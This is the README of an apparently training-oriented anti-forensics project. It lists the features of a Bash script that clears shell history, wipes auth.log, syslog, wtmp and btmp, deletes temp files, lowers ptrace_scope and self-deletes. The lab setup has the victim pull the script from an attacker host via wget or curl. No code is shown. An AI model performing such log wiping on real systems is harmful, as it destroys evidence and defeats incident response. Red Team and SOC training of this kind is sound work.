 Anti-Forensics Bash Script: SSH Log Wiper
This project demonstrates how attackers may clean up their traces after gaining remote access to a Linux system via SSH. It includes a Bash script that performs full cleanup of forensic artifacts, simulating realistic attacker behavior for Red Team or SOC training labs.

üéØ Features
Clears .bash_history and disables history logging

Wipes key system log files: auth.log, syslog, wtmp, btmp, etc.

Deletes temporary files from /tmp and /var/tmp

Optionally lowers ptrace_scope for stealth

Prompts user to optionally reboot the system

Self-destructs: deletes itself after execution or reboot

üß™ Lab Setup
Attacker: Kali Linux (hosts the script over HTTP)

Victim: Ubuntu server (pulls script via wget or curl and executes)
